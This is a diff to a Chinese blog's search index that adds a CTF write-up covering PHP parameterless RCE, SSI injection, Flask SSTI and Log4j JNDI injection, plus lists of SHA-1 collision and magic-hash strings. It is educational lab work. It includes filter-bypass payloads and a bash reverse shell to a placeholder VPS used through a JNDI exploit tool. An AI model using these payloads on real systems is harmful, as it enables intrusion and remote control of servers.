@@ -125,6 +125,88 @@ base64解码后得到文件名：<code>FLA9_VixNxtSRFfd8IoFlnNvv</code>，然后
       </tags>
   </entry>
   <entry>
+    <title>2022长安战疫网络安全卫士守护赛WP</title>
+    <url>/posts/59745/</url>
+    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+<p>最近各种烦心事接锤而至，博客也很久没更新了。现在空了更新一下，这个比赛也是好久之前的了，补个wp记录一下，下边贴个当时成绩的图<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/QQ%E6%88%AA%E5%9B%BE20220119104408.png" alt=""><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/%E8%AF%81%E4%B9%A6.jpg" alt=""></p>
+<h2 id="web"><a class="header-anchor" href="#web">¶</a>web</h2>
+<h3 id="RCE-No-Para"><a class="header-anchor" href="#RCE-No-Para">¶</a>RCE_No_Para</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>无参数rce，老考点了，这里过滤了<code>end</code>和<code>dir</code>，所以常用的办法都被ban了，不过还是存在很多可以利用的方法，不懂的同学可以来了解下面几个php函数</p>
+<blockquote>
+<p>get_defined_vars()：函数返回由所有已定义变量所组成的数组</p>
+</blockquote>
+<p>再套个<code>current()</code>便可以得到当前数组中的元素的值<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/RCE_No_Para/9%250PU%60R6H5DJ08UMK8%60BUPS.png" alt=""><br>
+这里我们可以通过参数 do 去自定义想要的值（也就是有机会构造rce)，不过正如前面所说，next、end 等一些操作数组指针指向的函数被 ban 了，所以要想指向让 do 跑到第一位，我们可以用反转功能的函数<code>array_reverse()</code><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/RCE_No_Para/%60555_H9%25TO22%29Y%25W%29FW3DLU.png" alt=""><br>
+接下来需要用的两个php函数</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array_flip()：交换数组中的键和值，成功时返回交换后的数组</span><br><span class="line">array_rand()：从数组中随机取出一个或多个随机键</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>首先通过<code>array_flip()</code>去把数组中的键和值进行交换，再用<code>array_rand()</code>函数去获取数组中的键的内容，如此我们得到可控的 rce 点，最终payload如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;eval(array_rand(array_flip(array_reverse(current(get_defined_vars())))));&amp;do&#x3D;system(&quot;cat+flag.php&quot;);</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/RCE_No_Para/%7D34F6A7%7BI5FZV_WU5TT%5BC2V.png" alt=""></p>
+<h3 id="Baby-Upload"><a class="header-anchor" href="#Baby-Upload">¶</a>Baby_Upload</h3>
+<p>这道题过滤了很多文件后缀，最后用到的点是<code>SSI注入</code></p>
+<blockquote>
+<p>SSI全称是Server Side Includes，即服务器端包含，是一种基于服务器端的网页制作技术。</p>
+<p>SSI在HTML文件中，可以通过注释行调用命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p>
+</blockquote>
+<p>也就是服务器启用了 SSI 功能，就有可能存在 SSI 注入。这里上传<code>shtml</code>文件<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/Baby_Upload/H_%7D~H8%29JOPNK6OE%5B7VKK6%283.png" alt=""><br>
+这里过滤了<code>ls</code>命令，所以使用 dir 去查看根目录文件，上传成功访问文件<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/Baby_Upload/YX~IVFM%5BOM6W%5D4%60R%25%7D%5BM73R.png" alt=""><br>
+接着使用<code>cut</code>命令去读取文件<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/Baby_Upload/%25B6%7D0_6GU%5B0693NJ7MI3H3M.png" alt=""><br>
+不过文件名被过滤了，使用<code>?</code>匹配符即可<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/Baby_Upload/32%40%25Y9L%40%40UDE1%60TLLQ%60%7BI_K.png" alt=""><br>
+最后访问获得flag<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/Baby_Upload/%5BA7NHL%25GZSRPTY5~S~3%7B6HU.png" alt=""></p>
+<h3 id="flask"><a class="header-anchor" href="#flask">¶</a>flask</h3>
+<p>查看网页源代码</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--/admin--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--/static.js--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--if not request.full_path.endswith(&quot;.js?&quot;):</span></span><br><span class="line"><span class="comment">            if not request.full_path.startswith(&quot;/login&quot;):</span></span><br><span class="line"><span class="comment">                return redirect(&quot;login&quot;)--&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注释给了一段hint，需要我们访问<code>/admin</code>路由，但是做了限制，要求请求的路径必须得<code>/login</code>开头或者<code>.js?</code>结尾，这里我们添加一个参数即可bypass<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/flask/5Q7XS%29_NI2CQOXJM~E%40B%5DG3.png" alt=""><br>
+接着提示访问<code>?name</code>，flask容易想到 ssti 模板注入<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/flask/R03JK0I2JVR%25HO%28C%285JB%7B_K.png" alt=""><br>
+确认是<code>ssti</code>注入后，便开始构造 payload，不过这里也做了很多限制，比如 ban 了中括号、点、下划线等等，对应去bypass即可，最后payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;admin?name&#x3D;&#123;&#123;lipsum|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat+&#x2F;flag&quot;)|attr(&quot;read&quot;)()&#125;&#125;&amp;dotast&#x3D;.js?</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/flask/RRM%7DS%288SCKO%5BE9%40SV0%60KQSS.png" alt=""></p>
+<h3 id="Shiro"><a class="header-anchor" href="#Shiro">¶</a>Shiro?</h3>
+<p>根据题目和页面判断是一个 shiro 的反序列化漏洞，但一直打不通，想到最近的<code>log4j</code>漏洞，考点兴许在这，在用户名和密码的输入点打了一个payload尝试</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap:&#x2F;&#x2F;gghkvh.dnslog.cn&#x2F;exp&#125;</span><br></pre></td></tr></table></figure>
+<p>回显Don’t Hacking Me，说明有过滤，测试过后发现过滤的是jndi关键字，通过<code>&#123;::-n&#125;</code>等规则替换即可</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi:&#x2F;&#x2F;r2lvm6.dnslog.cn&#x2F;exp&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/Shiro%3F/FAK%28I%5BI_E_4_PP77%7DB__XSB.png" alt=""><br>
+dnslog成功回显，接下来就是利用了。在github上找个几年前的轮子</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;welk1n&#x2F;JNDI-Injection-Exploit</span><br></pre></td></tr></table></figure>
+<p>下载到自己的 vps 上，首先将反弹shell编码成base64形式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx.xxx.xxx.xxx&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>接着通过jar包开启服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,base64编码的反弹shell语句&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;vps的ip&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/Shiro%3F/%28UYB9%28KHANAS%5DF2QQ3454%601.png" alt=""><br>
+然后多开一个窗口进行监听端口，在用户名填写对应生成的payload发送，例如我图中的是 9opfso</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi:&#x2F;&#x2F;ip:port&#x2F;9opfso&#125;</span><br></pre></td></tr></table></figure>
+<p>即可反弹shell成功<br>
+如果因为环境没成功，也可以使用<code>JNDIExploit-1.2-SNAPSHOT.jar</code>这个工具起 ldap 服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i ip</span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;:&#x2F;&#x2F;ip:1389&#x2F;Basic&#x2F;ReverseShell&#x2F;ip&#x2F;8989&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Flag配送中心"><a class="header-anchor" href="#Flag配送中心">¶</a>Flag配送中心</h3>
+<p>原谅我知之甚少，赛后看wp才知道考点是CVE-2016-5387，可能我太菜了，看不出来，也不知道有这个cve<br>
+开始复现，vps上监听端口，然后请求头加上<code>proxy:vpsip:port</code><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/Flag%E9%85%8D%E9%80%81%E4%B8%AD%E5%BF%83/%40_8_9E%28R%5B_G%7D_V%297LVD%5B03V.png" alt=""><br>
+vps监听到flag<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/2022%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB/Flag%E9%85%8D%E9%80%81%E4%B8%AD%E5%BF%83/CMH5O%7BA%7BM%28LWOBFR%28F4O%25%5BE.png" alt=""></p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>AoiAWD-萌新的得分利器</title>
     <url>/posts/16692/</url>
     <content><![CDATA[<h1>前言</h1>
@@ -1694,6 +1776,13 @@ is_numeric()：   用于检测变量是否为数字或数字字符串</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=getenv(<span class="string">&#x27;fllag&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no no no no way for you to do so.&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(is_array(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) || is_array(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;There is no way you can sneak me, young man!&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Hanzo:It is impossible only the tribe of Shimada can controle the dragon&lt;br/&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;Genji:We will see again Hanzo&#x27;</span>.<span class="variable">$flag</span>.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Wrong!&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Just G1ve it a try.&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>首先不能使用数组，其次是采用了<code>===</code>强比较，搜索后发现已存在 sha1 哈希碰撞，即payload为</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br><span class="line"></span><br><span class="line">pass&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br></pre></td></tr></table></figure>
+<h2 id="常用收集"><a class="header-anchor" href="#常用收集">¶</a>常用收集</h2>
+<p>md5</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">	text                      MD5 Hash</span><br><span class="line">0e215962017   &#x3D;&#x3D;&gt;  0e291242476940776845150308577824</span><br><span class="line">0e1284838308  &#x3D;&#x3D;&gt;  0e708279691820928818722257405159</span><br><span class="line">0e1137126905  &#x3D;&#x3D;&gt;  0e291659922323405260514745084877</span><br><span class="line">0e807097110	  &#x3D;&#x3D;&gt;  0e318093639164485566453180786895</span><br><span class="line">0e730083352	  &#x3D;&#x3D;&gt;  0e870635875304277170259950255928</span><br></pre></td></tr></table></figure>
+<p>md4</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">         text	                                MD4 Hash</span><br><span class="line">0e001233333333333334557778889   &#x3D;&#x3D;&gt;	  0e434041524824285414215559233446</span><br><span class="line">0e00000111222333333666788888889 &#x3D;&#x3D;&gt;	  0e641853458593358523155449768529</span><br><span class="line">0001235666666688888888888	    &#x3D;&#x3D;&gt;   0e832225036643258141969031181899</span><br></pre></td></tr></table></figure>
+<p>SHA1</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">               text	                                         SHA1 Hash</span><br><span class="line">0e00000000000000000000081614617300000000  &#x3D;&#x3D;&gt;	0e65307525940999632287492285468259219070</span><br><span class="line">0e00000000000000000000721902017120000000  &#x3D;&#x3D;&gt;	0e94981159498252295418182453841140483274</span><br><span class="line">0e01011001101011010001101110101100101000  &#x3D;&#x3D;&gt;	0e48906523151976751117677463787111106598</span><br><span class="line">0e11001000001010011000100000010001101000  &#x3D;&#x3D;&gt;	0e63407184960930419027062777705081379452</span><br><span class="line">0e01000001100000001010011011001000000100  &#x3D;&#x3D;&gt;	0e55962072388397083814346733718698213796</span><br><span class="line">0e10011110000101101000011101011010100100  &#x3D;&#x3D;&gt;	0e31188585417285828785355336774237712792</span><br><span class="line">0e01010111000111111010101011010111010100  &#x3D;&#x3D;&gt;	0e45906344569616659428808892091261969181</span><br><span class="line">0e00100001110000001111010000010011101100  &#x3D;&#x3D;&gt;	0e14860258669052332549568607710438132953</span><br><span class="line">0e11110000111010001001101111111110010010  &#x3D;&#x3D;&gt;	0e12174258436385758552874426941686538483</span><br><span class="line">0e10111110011100101100010101111010000110  &#x3D;&#x3D;&gt;	0e99774398282593376043462038572281385389</span><br><span class="line">0e11001111110111110010111010000011110110  &#x3D;&#x3D;&gt;	0e63185221301034624940345471074357888797</span><br><span class="line">0e00001010010101100100101011101110001110  &#x3D;&#x3D;&gt;	0e90943988772171749054413593888105986782</span><br><span class="line">0e01011101110010111011110010010010101110  &#x3D;&#x3D;&gt;	0e01608800192659803576771346607441737826</span><br><span class="line">0e10111110101111001000000100011101101110  &#x3D;&#x3D;&gt;	0e49094541458479495263034294421025186938</span><br><span class="line">0e11100111101110011010111001010101111110  &#x3D;&#x3D;&gt;	0e55770706149948760086200713505841887543</span><br><span class="line">0e11111001010101100110011001010001110001  &#x3D;&#x3D;&gt;	0e91120687121163809515824135435029958137</span><br><span class="line">0e01000111101111110010010010000001001001  &#x3D;&#x3D;&gt;	0e78071797328546369301825420848872451849</span><br><span class="line">0e00100110100010100110001101110110110101  &#x3D;&#x3D;&gt;	0e06077380408260614659219920561082767632</span><br><span class="line">0e11111100001011000011110100100010111101  &#x3D;&#x3D;&gt;	0e12149120354415335220758399492713921588</span><br><span class="line">0e00111100110101101001000101011011111101  &#x3D;&#x3D;&gt;	0e38661126569790555598431905065403870516</span><br><span class="line">0e10100011100101000001110010100110100011  &#x3D;&#x3D;&gt;	0e55745078154640212511596259055910278070</span><br><span class="line">0e10011110011111001001100100000111011011  &#x3D;&#x3D;&gt;	0e20319731123101477913295720812414482217</span><br></pre></td></tr></table></figure>
 ]]></content>
       <tags>
         <tag>ctf</tag>
